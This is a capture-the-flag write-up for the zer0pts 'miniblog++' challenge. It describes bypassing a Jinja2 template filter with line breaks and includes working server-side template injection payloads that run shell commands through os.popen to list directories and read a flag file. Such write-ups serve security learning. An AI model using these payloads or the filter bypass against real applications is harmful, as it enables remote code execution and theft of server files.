# miniblog++

## 📄 Description

I need to concentrate on the backup feature.

![Oops](./image/description.jpg)

## 💻 Explore the website

There is a form to login.

![Oops](./image/login.jpg)

I don't need to register, so I use `username = a` and `password = b` to test.

There are three buttons/features: `NEW`, `EXPORT`, `IMPORT`.

`NEW` button allows user to create a post on user's account.

![Oops](./image/post_test.jpg)

When I saw `{{title}}` in the pop-up form, I thought about SSTI Jinja2. So I tested:

![Oops](./image/post_test_ssti.jpg)

![Oops](./image/error.jpg)

Maybe input is filtered.

I continued to test all the features:

* `NEW` button: creates post

* `EXPORT` button: allows user to download encrypted file for backup.

* `IMPORT` button: allows user to upload backup file.

Maybe I can import arbitrary content (backup feature is mentioned in description) to exploit SSTI. But someone in Discord talked about unintended way.

## 🧑‍💻 Processing:
**app.py:**

There are some filter stages:
* `{%` is prohibited.
* All the words formed from `r"{{.*?}}"` have to match this form `r"{{!?[a-zA-Z0-9_]+}}"`.

Look at the dot in ``r"{{.*?}}"``. 

![Oops](./image/bypass_regex.jpg)

I can bypass using line breaks. 🤣
![Oops](./image/ssti_test_payload.jpg)
![Oops](./image/ssti_found.jpg)

I use RCE payload:

```py
{{ 
namespace.__init__.__globals__.os.popen('ls ../../').read() }}
```

![Oops](./image/exploit_ls.jpg)

```py
{{ 
namespace.__init__.__globals__.os.popen('cat ../../flag-wowRCEwow.txt').read() }}
```

![Oops](./image/flag.jpg)

**🚩Flag: `zer0pts{You_obtained_a_Bachelor_of_ZIP}`**

## P/S:
This is unintended way to solve this challenge. After realizing unintended way, zer0pts team released a harder version.